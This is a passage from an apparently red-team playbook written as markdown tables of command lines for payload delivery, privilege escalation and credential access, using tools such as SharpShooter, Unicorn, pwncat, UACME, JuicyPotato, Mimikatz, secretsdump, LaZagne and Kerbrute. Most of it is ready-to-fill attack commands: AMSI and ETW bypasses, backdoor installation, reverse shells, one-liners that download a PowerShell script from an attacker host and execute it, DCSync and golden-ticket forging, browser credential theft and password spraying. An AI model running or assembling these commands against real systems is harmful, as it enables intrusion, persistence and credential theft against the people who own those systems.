| 5 | Staged Delivery | `SharpShooter.py --payload js --output /opt/tsec/output/4.8.5_sharpshooter_staged --web {url} --rawsc {shellcode}.bin` | JS |
| 6 | Anti-Sandbox | `SharpShooter.py --stageless --payload js --sandbox --output /opt/tsec/output/4.8.6_sharpshooter_sandbox --rawsc {shellcode}.bin` | JS |
| 7 | AMSI Bypass | `SharpShooter.py --stageless --payload js --amsi --output /opt/tsec/output/4.8.7_sharpshooter_amsi --rawsc {shellcode}.bin` | JS |
| 8 | Custom Key | `SharpShooter.py --stageless --payload js --output /opt/tsec/output/4.8.8_sharpshooter_key --rawsc {shellcode}.bin --key {key}` | JS |
| 9 | HTML Smuggling | `SharpShooter.py --stageless --payload js --smuggle --output /opt/tsec/output/4.8.9_sharpshooter_smuggle --rawsc {shellcode}.bin` | HTML |
| 10 | Full Evasion | `SharpShooter.py --stageless --payload js --sandbox --amsi --smuggle --output /opt/tsec/output/4.8.10_sharpshooter_full --rawsc {shellcode}.bin` | HTML |

## Tool 4.9 — Unicorn
*PowerShell downgrade attack and shellcode injection tool.*

| Mode | Name | Command | Output |
|------|------|---------|--------|
| 1 | Reverse Shell | `python3 unicorn.py reverse_tcp {lhost} {lport} powershell > /opt/tsec/output/4.9.1_unicorn_rev.ps1` | PS1 |
| 2 | Macro Attack | `python3 unicorn.py reverse_tcp {lhost} {lport} macro > /opt/tsec/output/4.9.2_unicorn_macro.txt` | TXT |
| 3 | HTA Delivery | `python3 unicorn.py reverse_tcp {lhost} {lport} hta > /opt/tsec/output/4.9.3_unicorn_hta.txt` | TXT |
| 4 | Certutil | `python3 unicorn.py reverse_tcp {lhost} {lport} certutil > /opt/tsec/output/4.9.4_unicorn_certutil.txt` | TXT |
| 5 | Custom Shellcode | `python3 unicorn.py {shellcode_file} powershell > /opt/tsec/output/4.9.5_unicorn_custom.ps1` | PS1 |
| 6 | Custom Encoding | `python3 unicorn.py reverse_tcp {lhost} {lport} powershell 5 > /opt/tsec/output/4.9.6_unicorn_encoded.ps1` | PS1 |
| 7 | AMSI Bypass | `python3 unicorn.py reverse_tcp {lhost} {lport} powershell --amsi > /opt/tsec/output/4.9.7_unicorn_amsi.ps1` | PS1 |
| 8 | ETW Bypass | `python3 unicorn.py reverse_tcp {lhost} {lport} powershell --etw > /opt/tsec/output/4.9.8_unicorn_etw.ps1` | PS1 |
| 9 | Full Evasion | `python3 unicorn.py reverse_tcp {lhost} {lport} powershell --amsi --etw > /opt/tsec/output/4.9.9_unicorn_full.ps1` | PS1 |
| 10 | Macro + HTA | `python3 unicorn.py reverse_tcp {lhost} {lport} macro_hta > /opt/tsec/output/4.9.10_unicorn_macrohta.txt` | TXT |

## Tool 4.10 — pwncat
*Sophisticated post-exploitation platform and bind/reverse shell handler.*

| Mode | Name | Command | Output |
|------|------|---------|--------|
| 1 | Listener | `pwncat-cs -lp {lport} > /opt/tsec/output/4.10.1_pwncat_listener.txt` | TXT |
| 2 | Connect Mode | `pwncat-cs {target}:{port} > /opt/tsec/output/4.10.2_pwncat_connect_{target}.txt` | TXT |
| 3 | SSL Listener | `pwncat-cs -lp {lport} --ssl > /opt/tsec/output/4.10.3_pwncat_ssl.txt` | TXT |
| 4 | SSH Pivot | `pwncat-cs -lp {lport} --ssl -m linux --identity {key} {user}@{target} > /opt/tsec/output/4.10.4_pwncat_ssh_{target}.txt` | TXT |
| 5 | Backdoor Install | `pwncat-cs -lp {lport} --install {backdoor_type} > /opt/tsec/output/4.10.5_pwncat_backdoor.txt` | TXT |
| 6 | Auto Escalate | `pwncat-cs -lp {lport} --persist-escalate > /opt/tsec/output/4.10.6_pwncat_escalate.txt` | TXT |
| 7 | Windows Shell | `pwncat-cs -lp {lport} -m windows > /opt/tsec/output/4.10.7_pwncat_windows.txt` | TXT |
| 8 | File Upload | `(pwncat) upload {local_file} {remote_path}` | ACTION |
| 9 | File Download | `(pwncat) download {remote_file} {local_path}` | ACTION |
| 10 | Full Session | `pwncat-cs -lp {lport} --ssl -m linux --persist-escalate --backdoor > /opt/tsec/output/4.10.10_pwncat_full.txt` | TXT |

---

# Phase 5: Privilege Escalation

> **Elevate access rights from standard user to administrative or root-level privileges. This phase is critical for achieving full system compromise.**

---

## Tool 5.1 — LinPEAS
*The definitive Linux privilege escalation automation script.*

| Mode | Name | Command | Output |
|------|------|---------|--------|
| 1 | Standard Run | `./linpeas.sh > /opt/tsec/output/5.1.1_linpeas.txt` | TXT |
| 2 | Full Scan | `./linpeas.sh -a > /opt/tsec/output/5.1.2_linpeas_full.txt` | TXT |
| 3 | Password Supply | `./linpeas.sh -P '{password}' > /opt/tsec/output/5.1.3_linpeas_password.txt` | TXT |
| 4 | Network Enum | `./linpeas.sh -N > /opt/tsec/output/5.1.4_linpeas_network.txt` | TXT |
| 5 | Password Search | `./linpeas.sh -q > /opt/tsec/output/5.1.5_linpeas_quiet.txt` | TXT |
| 6 | Container Check | `./linpeas.sh -c > /opt/tsec/output/5.1.6_linpeas_container.txt` | TXT |
| 7 | SUID Focus | `./linpeas.sh \| grep -i 'suid' > /opt/tsec/output/5.1.7_linpeas_suid.txt` | TXT |
| 8 | Writable Files | `./linpeas.sh \| grep -i 'writable' > /opt/tsec/output/5.1.8_linpeas_writable.txt` | TXT |
| 9 | Cron Jobs | `./linpeas.sh \| grep -i 'cron' > /opt/tsec/output/5.1.9_linpeas_cron.txt` | TXT |
| 10 | Maximum Enum | `./linpeas.sh -a -N -P '{password}' > /opt/tsec/output/5.1.10_linpeas_maximum.txt` | TXT |

## Tool 5.2 — WinPEAS
*Windows privilege escalation enumeration — the PEASS-ng counterpart.*

| Mode | Name | Command | Output |
|------|------|---------|--------|
| 1 | Standard Scan | `winPEASany.exe > /opt/tsec/output/5.2.1_winpeas.txt` | TXT |
| 2 | Full Scan | `winPEASany.exe all > /opt/tsec/output/5.2.2_winpeas_full.txt` | TXT |
| 3 | Fast Scan | `winPEASany.exe fast > /opt/tsec/output/5.2.3_winpeas_fast.txt` | TXT |
| 4 | Domain Joined | `winPEASany.exe domain > /opt/tsec/output/5.2.4_winpeas_domain.txt` | TXT |
| 5 | Services Check | `winPEASany.exe \| findstr /i 'service' > /opt/tsec/output/5.2.5_winpeas_services.txt` | TXT |
| 6 | Registry Check | `winPEASany.exe \| findstr /i 'registry' > /opt/tsec/output/5.2.6_winpeas_registry.txt` | TXT |
| 7 | Scheduled Tasks | `winPEASany.exe \| findstr /i 'schedule' > /opt/tsec/output/5.2.7_winpeas_scheduled.txt` | TXT |
| 8 | Token Analysis | `winPEASany.exe \| findstr /i 'token' > /opt/tsec/output/5.2.8_winpeas_tokens.txt` | TXT |
| 9 | AutoLogon | `winPEASany.exe \| findstr /i 'autologon' > /opt/tsec/output/5.2.9_winpeas_autologon.txt` | TXT |
| 10 | Comprehensive | `winPEASany.exe all quiet > /opt/tsec/output/5.2.10_winpeas_comprehensive.txt` | TXT |

## Tool 5.3 — GTFONow
*Automated GTFOBins exploitation for misconfigured sudo/SUID.*

| Mode | Name | Command | Output |
|------|------|---------|--------|
| 1 | Full Check | `gtfonow -a > /opt/tsec/output/5.3.1_gtfonow_full.txt` | TXT |
| 2 | Sudo Check | `gtfonow -s > /opt/tsec/output/5.3.2_gtfonow_sudo.txt` | TXT |
| 3 | SUID Check | `gtfonow -u > /opt/tsec/output/5.3.3_gtfonow_suid.txt` | TXT |
| 4 | Capabilities | `gtfonow -c > /opt/tsec/output/5.3.4_gtfonow_caps.txt` | TXT |
| 5 | Auto Exploit | `gtfonow -a -e > /opt/tsec/output/5.3.5_gtfonow_exploit.txt` | TXT |
| 6 | Verbose | `gtfonow -a -v > /opt/tsec/output/5.3.6_gtfonow_verbose.txt` | TXT |
| 7 | Custom Binary | `gtfonow -b {binary_path} > /opt/tsec/output/5.3.7_gtfonow_binary.txt` | TXT |
| 8 | Safe Mode | `gtfonow -a --safe > /opt/tsec/output/5.3.8_gtfonow_safe.txt` | TXT |
| 9 | JSON Output | `gtfonow -a -o json > /opt/tsec/output/5.3.9_gtfonow.json` | JSON |
| 10 | Emergency | `gtfonow -a -e -v > /opt/tsec/output/5.3.10_gtfonow_emergency.txt` | TXT |

## Tool 5.4 — traitor
*Automatic Linux privilege escalation exploit tool.*

| Mode | Name | Command | Output |
|------|------|---------|--------|
| 1 | Auto Exploit | `./traitor -a > /opt/tsec/output/5.4.1_traitor_auto.txt` | TXT |
| 2 | Docker Check | `./traitor -d > /opt/tsec/output/5.4.2_traitor_docker.txt` | TXT |
| 3 | Polkit Exploit | `./traitor -p > /opt/tsec/output/5.4.3_traitor_polkit.txt` | TXT |
| 4 | Kernel Exploit | `./traitor -k > /opt/tsec/output/5.4.4_traitor_kernel.txt` | TXT |
| 5 | Sudo Check | `./traitor -s > /opt/tsec/output/5.4.5_traitor_sudo.txt` | TXT |
| 6 | Verbose | `./traitor -a -v > /opt/tsec/output/5.4.6_traitor_verbose.txt` | TXT |
| 7 | Exploit Only | `./traitor -e {exploit_name} > /opt/tsec/output/5.4.7_traitor_specific.txt` | TXT |
| 8 | No Color | `./traitor -a --no-color > /opt/tsec/output/5.4.8_traitor_nocolor.txt` | TXT |
| 9 | Timeout | `./traitor -a -t 120 > /opt/tsec/output/5.4.9_traitor_timeout.txt` | TXT |
| 10 | Full Assessment | `./traitor -a -d -p -k -s -v > /opt/tsec/output/5.4.10_traitor_full.txt` | TXT |

## Tool 5.5 — Linux Exploit Suggester 2
*Kernel exploit suggestion tool for Linux systems.*

| Mode | Name | Command | Output |
|------|------|---------|--------|
| 1 | Kernel Check | `python3 linux-exploit-suggester-2.py --kernel {kernel_version} > /opt/tsec/output/5.5.1_les2_kernel.txt` | TXT |
| 2 | Current Kernel | `python3 linux-exploit-suggester-2.py --uname '$(uname -r)' > /opt/tsec/output/5.5.2_les2_current.txt` | TXT |
| 3 | Download | `python3 linux-exploit-suggester-2.py --kernel {version} --download > /opt/tsec/output/5.5.3_les2_download.txt` | TXT |
| 4 | Full Report | `python3 linux-exploit-suggester-2.py --kernel {version} --full > /opt/tsec/output/5.5.4_les2_full.txt` | TXT |
| 5 | Check Applicability | `python3 linux-exploit-suggester-2.py --kernel {version} --check > /opt/tsec/output/5.5.5_les2_check.txt` | TXT |
| 6 | JSON Output | `python3 linux-exploit-suggester-2.py --kernel {version} --json > /opt/tsec/output/5.5.6_les2.json` | JSON |
| 7 | Priority Filter | `python3 linux-exploit-suggester-2.py --kernel {version} --priority high > /opt/tsec/output/5.5.7_les2_high.txt` | TXT |
| 8 | Exclude Patched | `python3 linux-exploit-suggester-2.py --kernel {version} --no-duplicates > /opt/tsec/output/5.5.8_les2_nodup.txt` | TXT |
| 9 | Source URLs | `python3 linux-exploit-suggester-2.py --kernel {version} --sources > /opt/tsec/output/5.5.9_les2_sources.txt` | TXT |
| 10 | Full Assessment | `python3 linux-exploit-suggester-2.py --kernel {version} --full --download --json > /opt/tsec/output/5.5.10_les2_assessment.txt` | TXT |

## Tool 5.6 — UACME
*User Account Control bypass collection (70+ methods).*

| Mode | Name | Command | Output |
|------|------|---------|--------|
| 1 | Method 33 | `akagi64.exe 33 > /opt/tsec/output/5.6.1_uacme_method33.txt` | TXT |
| 2 | Method 65 | `akagi64.exe 65 > /opt/tsec/output/5.6.2_uacme_method65.txt` | TXT |
| 3 | Method 70 | `akagi64.exe 70 > /opt/tsec/output/5.6.3_uacme_method70.txt` | TXT |
| 4 | Method 23 | `akagi64.exe 23 > /opt/tsec/output/5.6.4_uacme_method23.txt` | TXT |
| 5 | List Methods | `akagi64.exe --list > /opt/tsec/output/5.6.5_uacme_list.txt` | TXT |
| 6 | Custom Command | `akagi64.exe 33 'cmd.exe /c whoami > C:\temp\out.txt' > /opt/tsec/output/5.6.6_uacme_custom.txt` | TXT |
| 7 | Verify Elevation | `akagi64.exe 33 'whoami /groups \| findstr High' > /opt/tsec/output/5.6.7_uacme_verify.txt` | TXT |
| 8 | Silent PowerShell | `akagi64.exe 33 'powershell.exe -enc {base64}' > /opt/tsec/output/5.6.8_uacme_silent.txt` | TXT |
| 9 | Fileless Bypass | `akagi64.exe 33 'powershell -nop -w hidden -c {command}' > /opt/tsec/output/5.6.9_uacme_fileless.txt` | TXT |
| 10 | Reverse Shell | `akagi64.exe 33 'powershell -nop -c iex(iwr http://{lhost}/{script})' > /opt/tsec/output/5.6.10_uacme_revshell.txt` | TXT |

## Tool 5.7 — PSExec (Sysinternals)
*Remote command execution for SYSTEM-level access.*

| Mode | Name | Command | Output |
|------|------|---------|--------|
| 1 | Remote Shell | `psexec.exe \\{target} -u {user} -p {password} cmd.exe > /opt/tsec/output/5.7.1_psexec_shell_{target}.txt` | TXT |
| 2 | System Shell | `psexec.exe \\{target} -u {user} -p {password} -s cmd.exe > /opt/tsec/output/5.7.2_psexec_system_{target}.txt` | TXT |
| 3 | Single Command | `psexec.exe \\{target} -u {user} -p {password} -s whoami > /opt/tsec/output/5.7.3_psexec_whoami_{target}.txt` | TXT |
| 4 | Copy & Execute | `psexec.exe \\{target} -u {user} -p {password} -c {local_exe} > /opt/tsec/output/5.7.4_psexec_copy_{target}.txt` | TXT |
| 5 | User Session | `psexec.exe \\{target} -u {user} -p {password} -i {session} notepad.exe > /opt/tsec/output/5.7.5_psexec_interactive_{target}.txt` | TXT |
| 6 | Local System | `psexec.exe -s -i cmd.exe > /opt/tsec/output/5.7.6_psexec_local.txt` | TXT |
| 7 | Hash Auth | `psexec.exe \\{target} -u {user} -p {ntlm_hash} -s cmd.exe > /opt/tsec/output/5.7.7_psexec_hash_{target}.txt` | TXT |
| 8 | No Profile | `psexec.exe \\{target} -u {user} -p {password} -e cmd.exe > /opt/tsec/output/5.7.8_psexec_noprofile_{target}.txt` | TXT |
| 9 | Background | `psexec.exe \\{target} -u {user} -p {password} -d notepad.exe > /opt/tsec/output/5.7.9_psexec_bg_{target}.txt` | TXT |
| 10 | Full Remote Admin | `psexec.exe \\{target} -u {user} -p {password} -s -c -f {payload_exe} > /opt/tsec/output/5.7.10_psexec_full_{target}.txt` | TXT |

## Tool 5.8 — JuicyPotato / RoguePotato
*DCOM/RPC privilege escalation via token impersonation.*

| Mode | Name | Command | Output |
|------|------|---------|--------|
| 1 | Basic Exploit | `JuicyPotato.exe -l 1337 -c {clsid} -p {program} -a {args} > /opt/tsec/output/5.8.1_juicy_basic.txt` | TXT |
| 2 | CLSID Auto | `JuicyPotato.exe -l 1337 -p cmd.exe -a '/c whoami > C:\temp\out.txt' > /opt/tsec/output/5.8.2_juicy_autoclsid.txt` | TXT |
| 3 | Netcat Shell | `JuicyPotato.exe -l 1337 -p nc.exe -a '{lhost} {lport} -e cmd.exe' > /opt/tsec/output/5.8.3_juicy_netcat.txt` | TXT |
| 4 | PowerShell | `JuicyPotato.exe -l 1337 -p powershell.exe -a '-enc {base64_command}' > /opt/tsec/output/5.8.4_juicy_powershell.txt` | TXT |
| 5 | RoguePotato | `RoguePotato.exe -r {lhost} -e 'cmd.exe /c whoami' -l 9999 > /opt/tsec/output/5.8.5_rogue.txt` | TXT |
| 6 | SweetPotato | `SweetPotato.exe -p {program} -a {args} > /opt/tsec/output/5.8.6_sweet.txt` | TXT |
| 7 | PrintSpoofer | `PrintSpoofer.exe -c 'cmd.exe /c whoami' > /opt/tsec/output/5.8.7_printspoofer.txt` | TXT |
| 8 | GodPotato | `GodPotato.exe -cmd 'cmd /c whoami' > /opt/tsec/output/5.8.8_godpotato.txt` | TXT |
| 9 | Coerced Auth | `juicypotato.exe -l 1337 -t \* -p {program} -c {clsid} > /opt/tsec/output/5.8.9_juicy_coerced.txt` | TXT |
| 10 | Full SYSTEM | `JuicyPotato.exe -l 1337 -p powershell.exe -a '-nop -w hidden -c iex(iwr http://{lhost}/shell.ps1)' > /opt/tsec/output/5.8.10_juicy_full.txt` | TXT |

## Tool 5.9 — Watson
*Missing KB patch enumeration for Windows privilege escalation.*

| Mode | Name | Command | Output |
|------|------|---------|--------|
| 1 | Basic Enum | `Watson.exe > /opt/tsec/output/5.9.1_watson.txt` | TXT |
| 2 | Output File | `Watson.exe > /opt/tsec/output/5.9.2_watson_out.txt` | TXT |
| 3 | Recent CVEs | `Watson.exe \| findstr 'CVE-2024\|CVE-2025\|CVE-2026' > /opt/tsec/output/5.9.3_watson_recent.txt` | TXT |
| 4 | Public Exploits | `Watson.exe \| findstr 'Exploit: True' > /opt/tsec/output/5.9.4_watson_public.txt` | TXT |
| 5 | OS Version | `systeminfo \| findstr /B /C:'OS Name' /C:'OS Version' && Watson.exe > /opt/tsec/output/5.9.5_watson_os.txt` | TXT |
| 6 | WES-NG | `python3 wes.py systeminfo.txt -e > /opt/tsec/output/5.9.6_watson_wes.txt` | TXT |
| 7 | Hotfix Check | `systeminfo \| findstr 'Hotfix(s)' > /opt/tsec/output/5.9.7_watson_hotfixes.txt` | TXT |
| 8 | Specific KB | `Watson.exe \| findstr '{kb_number}' > /opt/tsec/output/5.9.8_watson_kb.txt` | TXT |
| 9 | ExploitDB Pipe | `Watson.exe \| grep 'CVE' \| while read cve; do searchsploit $cve; done > /opt/tsec/output/5.9.9_watson_exploitdb.txt` | TXT |
| 10 | Full Assessment | `systeminfo > /opt/tsec/output/5.9.10_watson_systeminfo.txt && Watson.exe > /opt/tsec/output/5.9.10_watson_assessment.txt` | TXT |

## Tool 5.10 — SUDO_KILLER
*Identify and exploit sudo misconfigurations on Unix-like systems.*

| Mode | Name | Command | Output |
|------|------|---------|--------|
| 1 | Basic Scan | `./sudo_killer.sh -c -r /opt/tsec/output/5.10.1_sudokiller_report.txt` | TXT |
| 2 | CVE Check | `./sudo_killer.sh -c -e > /opt/tsec/output/5.10.2_sudokiller_cve.txt` | TXT |
| 3 | Exploit Test | `./sudo_killer.sh -c -i > /opt/tsec/output/5.10.3_sudokiller_exploit.txt` | TXT |
| 4 | Sudoers Analysis | `./sudo_killer.sh -c -s > /opt/tsec/output/5.10.4_sudokiller_sudoers.txt` | TXT |
| 5 | Environment Check | `./sudo_killer.sh -c -g > /opt/tsec/output/5.10.5_sudokiller_env.txt` | TXT |
| 6 | Version Check | `./sudo_killer.sh -v > /opt/tsec/output/5.10.6_sudokiller_version.txt` | TXT |
| 7 | Custom Sudoers | `./sudo_killer.sh -f {sudoers_file} -c > /opt/tsec/output/5.10.7_sudokiller_custom.txt` | TXT |
| 8 | LD_PRELOAD | `./sudo_killer.sh -c -l > /opt/tsec/output/5.10.8_sudokiller_ldpreload.txt` | TXT |
| 9 | Wildcard Check | `./sudo_killer.sh -c -w > /opt/tsec/output/5.10.9_sudokiller_wildcard.txt` | TXT |
| 10 | Full Audit | `./sudo_killer.sh -c -e -i -s -g -w -r /opt/tsec/output/5.10.10_sudokiller_full.txt` | TXT |

---

# Phase 6: Credential Access

> **Steal credentials from target systems through memory dumping, keylogging, network sniffing, and Kerberos attacks.**

---

## Tool 6.1 — Mimikatz
*The iconic credential extraction tool for Windows.*

| Mode | Name | Command | Output |
|------|------|---------|--------|
| 1 | Logon Passwords | `mimikatz "privilege::debug" "sekurlsa::logonpasswords" "exit" > /opt/tsec/output/6.1.1_mimikatz_passwords.txt` | TXT |
| 2 | LSA Dump | `mimikatz "privilege::debug" "lsadump::lsa /patch" "exit" > /opt/tsec/output/6.1.2_mimikatz_lsa.txt` | TXT |
| 3 | DCSync | `mimikatz "privilege::debug" "lsadump::dcsync /domain:{domain} /user:{target_user}" "exit" > /opt/tsec/output/6.1.3_mimikatz_dcsync_{target_user}.txt` | TXT |
| 4 | SAM Database | `mimikatz "privilege::debug" "lsadump::sam" "exit" > /opt/tsec/output/6.1.4_mimikatz_sam.txt` | TXT |
| 5 | Kerberos Tickets | `mimikatz "sekurlsa::tickets /export" "exit" > /opt/tsec/output/6.1.5_mimikatz_tickets.txt` | TXT |
| 6 | Golden Ticket | `mimikatz "kerberos::golden /user:{user} /domain:{domain} /sid:{sid} /krbtgt:{hash} /id:500" "exit" > /opt/tsec/output/6.1.6_mimikatz_golden.txt` | TXT |
| 7 | Silver Ticket | `mimikatz "kerberos::silver /user:{user} /domain:{domain} /sid:{sid} /target:{host} /service:{service} /rc4:{hash}" "exit" > /opt/tsec/output/6.1.7_mimikatz_silver.txt` | TXT |
| 8 | DPAPI Extract | `mimikatz "dpapi::chrome /in:'%localappdata%\Google\Chrome\User Data\Default\Login Data'" "exit" > /opt/tsec/output/6.1.8_mimikatz_dpapi.txt` | TXT |
| 9 | Token Elevate | `mimikatz "token::elevate" "exit" > /opt/tsec/output/6.1.9_mimikatz_token.txt` | TXT |
| 10 | Full Credential Dump | `mimikatz "privilege::debug" "sekurlsa::logonpasswords" "lsadump::lsa /inject /name:krbtgt" "exit" > /opt/tsec/output/6.1.10_mimikatz_full.txt` | TXT |

## Tool 6.2 — Hashcat
*The world's fastest password recovery tool with GPU acceleration.*

| Mode | Name | Command | Output |
|------|------|---------|--------|
| 1 | NTLM Crack | `hashcat -m 1000 -a 0 {hash_file} {wordlist} -o /opt/tsec/output/6.2.1_hashcat_ntlm.txt` | TXT |
| 2 | MD5 Brute | `hashcat -m 0 -a 3 {hash_file} '?a?a?a?a?a?a?a' -o /opt/tsec/output/6.2.2_hashcat_md5.txt` | TXT |
| 3 | SHA256 Wordlist | `hashcat -m 1400 -a 0 {hash_file} {wordlist} -o /opt/tsec/output/6.2.3_hashcat_sha256.txt` | TXT |
| 4 | NTLMv2 Crack | `hashcat -m 5600 -a 0 {hash_file} {wordlist} -o /opt/tsec/output/6.2.4_hashcat_netntlmv2.txt` | TXT |
| 5 | bcrypt Attack | `hashcat -m 3200 -a 0 {hash_file} {wordlist} -o /opt/tsec/output/6.2.5_hashcat_bcrypt.txt` | TXT |
| 6 | Mask Attack | `hashcat -m 1000 -a 3 {hash_file} '?u?l?l?l?l?d?d?s' -o /opt/tsec/output/6.2.6_hashcat_mask.txt` | TXT |
| 7 | Hybrid Attack | `hashcat -m 1000 -a 6 {hash_file} {wordlist} '?d?d?d?d' -o /opt/tsec/output/6.2.7_hashcat_hybrid.txt` | TXT |
| 8 | Rules Attack | `hashcat -m 1000 -a 0 {hash_file} {wordlist} -r {rules_file} -o /opt/tsec/output/6.2.8_hashcat_rules.txt` | TXT |
| 9 | LM Hash Crack | `hashcat -m 3000 -a 3 {hash_file} '?a?a?a?a?a?a?a' -o /opt/tsec/output/6.2.9_hashcat_lm.txt` | TXT |
| 10 | Full Benchmark | `hashcat -m 1000 -a 0 {hash_file} {wordlist} -O -w 3 --force -o /opt/tsec/output/6.2.10_hashcat_full.txt` | TXT |

## Tool 6.3 — secretsdump.py (Impacket)
*Remotely dump SAM, LSA secrets, and NTDS.dit from Windows systems.*

| Mode | Name | Command | Output |
|------|------|---------|--------|
| 1 | Remote SAM | `secretsdump.py {domain}/{user}:{password}@{target} > /opt/tsec/output/6.3.1_secretsdump_sam_{target}.txt` | TXT |
| 2 | DCSync Attack | `secretsdump.py {domain}/{user}:{password}@{dc_ip} -just-dc-ntlm > /opt/tsec/output/6.3.2_secretsdump_dcsync_{dc}.txt` | TXT |
| 3 | NTDS Extract | `secretsdump.py -ntds {ntds_file} -system {system_hive} LOCAL > /opt/tsec/output/6.3.3_secretsdump_ntds.txt` | TXT |
| 4 | SAM Hives | `secretsdump.py -sam {sam_hive} -system {system_hive} LOCAL > /opt/tsec/output/6.3.4_secretsdump_hives.txt` | TXT |
| 5 | Pass-the-Hash | `secretsdump.py -hashes {lmhash}:{nthash} {domain}/{user}@{target} > /opt/tsec/output/6.3.5_secretsdump_pth_{target}.txt` | TXT |
| 6 | VSS Method | `secretsdump.py {domain}/{user}:{password}@{target} -use-vss > /opt/tsec/output/6.3.6_secretsdump_vss_{target}.txt` | TXT |
| 7 | Kerberos Auth | `secretsdump.py -k -no-pass {domain}/{user}@{target} > /opt/tsec/output/6.3.7_secretsdump_kerb_{target}.txt` | TXT |
| 8 | History Hashes | `secretsdump.py {domain}/{user}:{password}@{dc_ip} -history > /opt/tsec/output/6.3.8_secretsdump_history_{dc}.txt` | TXT |
| 9 | User Targeted | `secretsdump.py {domain}/{user}:{password}@{dc_ip} -just-dc-user {target_user} > /opt/tsec/output/6.3.9_secretsdump_user_{target_user}.txt` | TXT |
| 10 | Full Domain Dump | `secretsdump.py {domain}/{user}:{password}@{dc_ip} -just-dc-ntlm -history -pwd-last-set > /opt/tsec/output/6.3.10_secretsdump_full_{dc}.txt` | TXT |

## Tool 6.4 — John the Ripper
*Fast password cracker with extensive hash type support.*

| Mode | Name | Command | Output |
|------|------|---------|--------|
| 1 | Auto Detect | `john {hash_file} > /opt/tsec/output/6.4.1_john_auto.txt` | TXT |
| 2 | Wordlist | `john --wordlist={wordlist} {hash_file} > /opt/tsec/output/6.4.2_john_wordlist.txt` | TXT |
| 3 | Incremental | `john --incremental {hash_file} > /opt/tsec/output/6.4.3_john_incremental.txt` | TXT |
| 4 | Rules Attack | `john --wordlist={wordlist} --rules {hash_file} > /opt/tsec/output/6.4.4_john_rules.txt` | TXT |
| 5 | NTLM Format | `john --format=nt {hash_file} > /opt/tsec/output/6.4.5_john_ntlm.txt` | TXT |
| 6 | Show Cracked | `john --show {hash_file} > /opt/tsec/output/6.4.6_john_show.txt` | TXT |
| 7 | GPU Acceleration | `john --format={format} --device=gpu {hash_file} > /opt/tsec/output/6.4.7_john_gpu.txt` | TXT |
| 8 | SHA512crypt | `john --format=sha512crypt {hash_file} > /opt/tsec/output/6.4.8_john_sha512.txt` | TXT |
| 9 | Session Resume | `john --restore={session_name} > /opt/tsec/output/6.4.9_john_restore.txt` | TXT |
| 10 | Comprehensive | `john --wordlist={wordlist} --rules --incremental {hash_file} > /opt/tsec/output/6.4.10_john_full.txt` | TXT |

## Tool 6.5 — LaZagne
*Cross-platform credential recovery from local software stores.*

| Mode | Name | Command | Output |
|------|------|---------|--------|
| 1 | All Modules | `lazagne all > /opt/tsec/output/6.5.1_lazagne_all.txt` | TXT |
| 2 | Browsers | `lazagne browsers > /opt/tsec/output/6.5.2_lazagne_browsers.txt` | TXT |
| 3 | Windows Credential | `lazagne windows > /opt/tsec/output/6.5.3_lazagne_windows.txt` | TXT |
| 4 | Databases | `lazagne databases > /opt/tsec/output/6.5.4_lazagne_databases.txt` | TXT |
| 5 | WiFi Passwords | `lazagne wifi > /opt/tsec/output/6.5.5_lazagne_wifi.txt` | TXT |
| 6 | Git Credentials | `lazagne git > /opt/tsec/output/6.5.6_lazagne_git.txt` | TXT |
| 7 | Chats & Mails | `lazagne chats mails > /opt/tsec/output/6.5.7_lazagne_chats.txt` | TXT |
| 8 | Quiet Mode | `lazagne all -quiet -output /opt/tsec/output/6.5.8_lazagne_quiet.txt` | TXT |
| 9 | Specific Browser | `lazagne browsers -firefox > /opt/tsec/output/6.5.9_lazagne_firefox.txt` | TXT |
| 10 | Full Credential Sweep | `lazagne all -vv -output /opt/tsec/output/6.5.10_lazagne_full.txt` | TXT |

## Tool 6.6 — pypykatz
*Pure Python Mimikatz implementation for credential extraction.*

| Mode | Name | Command | Output |
|------|------|---------|--------|
| 1 | LSASS Dump | `pypykatz lsa minidump {lsass.dmp} > /opt/tsec/output/6.6.1_pypykatz_lsass.txt` | TXT |
| 2 | Live Registry | `pypykatz live lsa > /opt/tsec/output/6.6.2_pypykatz_live.txt` | TXT |
| 3 | SAM Hives | `pypykatz registry {system_hive} {sam_hive} > /opt/tsec/output/6.6.3_pypykatz_sam.txt` | TXT |
| 4 | Cached Creds | `pypykatz registry {security_hive} {system_hive} --json > /opt/tsec/output/6.6.4_pypykatz_cached.json` | JSON |
| 5 | DPAPI Secrets | `pypykatz dpapi minidump {lsass.dmp} > /opt/tsec/output/6.6.5_pypykatz_dpapi.txt` | TXT |
| 6 | Kerberos Tickets | `pypykatz kerberos minidump {lsass.dmp} > /opt/tsec/output/6.6.6_pypykatz_kerberos.txt` | TXT |
| 7 | LSA Secrets | `pypykatz registry {security_hive} --lsa-secret > /opt/tsec/output/6.6.7_pypykatz_lsa.txt` | TXT |
| 8 | JSON Output | `pypykatz lsa minidump {dump} -o json > /opt/tsec/output/6.6.8_pypykatz.json` | JSON |
| 9 | Backup Key | `pypykatz dpapi backupkeys {security_hive} > /opt/tsec/output/6.6.9_pypykatz_backup.txt` | TXT |
| 10 | Full Analysis | `pypykatz lsa minidump {lsass.dmp} && pypykatz dpapi minidump {lsass.dmp} > /opt/tsec/output/6.6.10_pypykatz_full.txt` | TXT |

## Tool 6.7 — Kerbrute
*Kerberos pre-authentication brute-forcing and user enumeration.*

| Mode | Name | Command | Output |
|------|------|---------|--------|
| 1 | User Enum | `kerbrute userenum --dc {dc_ip} -d {domain} {userlist} -o /opt/tsec/output/6.7.1_kerbrute_enum.txt` | TXT |
| 2 | Password Spray | `kerbrute passwordspray --dc {dc_ip} -d {domain} {userlist} {password} -o /opt/tsec/output/6.7.2_kerbrute_spray.txt` | TXT |
| 3 | Brute Force | `kerbrute bruteuser --dc {dc_ip} -d {domain} {wordlist} {username} -o /opt/tsec/output/6.7.3_kerbrute_brute.txt` | TXT |
| 4 | AS-REP Roast | `kerbrute userenum --dc {dc_ip} -d {domain} {userlist} 2>&1 \| grep 'no pre-auth' > /opt/tsec/output/6.7.4_kerbrute_asrep.txt` | TXT |
| 5 | Safe Spray | `kerbrute passwordspray --dc {dc_ip} -d {domain} {userlist} {pass} -t 1 -o /opt/tsec/output/6.7.5_kerbrute_safe.txt` | TXT |
| 6 | Custom KDC | `kerbrute userenum --kdc {kdc_host} -d {domain} {userlist} -o /opt/tsec/output/6.7.6_kerbrute_kdc.txt` | TXT |
| 7 | JSON Output | `kerbrute userenum --dc {dc_ip} -d {domain} {userlist} -o /opt/tsec/output/6.7.7_kerbrute.json` | JSON |
